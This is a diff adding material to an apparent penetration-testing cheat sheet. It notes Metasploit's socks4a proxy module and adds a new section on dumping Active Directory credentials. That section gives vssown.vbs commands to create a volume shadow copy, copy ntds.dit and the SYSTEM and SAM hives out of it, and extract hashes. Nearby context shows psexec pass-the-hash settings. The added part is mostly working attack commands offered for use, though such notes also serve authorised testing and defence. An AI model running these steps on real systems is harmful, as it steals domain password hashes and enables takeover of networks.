@@ -126,6 +126,10 @@ Proxies => socks4:127.0.0.1:9999
 msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
 ```
 MSF usage of ssh -D proxy
+```
+use auxiliary/server/socks4a
+```
+can also be used
 
 #### John
 
@@ -184,6 +188,27 @@ MSF can do this
 use exploit/windows/smb/psexec
 set SMBPass LANMAN:NT
  ```
+#### ntds.dit  
+`https://github.com/reider-roque/pentest-tools/tree/master/password-cracking`
+
+vssown.vbs can be downloaded from above
+```
+cscript vssown.vbs /status
+cscript vssown.vbs /start
+cscript vssown.vbs /create /c
+```
+copy  
+```
+GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\ntds\ntds.dit ntdsbackup.dit
+GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SYSTEM systembackup.bak
+GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SAM sambackup.bak
+```
+```
+cscript vssown.vbs /stop
+```
+Follow `http://www.ntdsxtract.com` to extract hashes
+
+
 
 #### VoIP
 
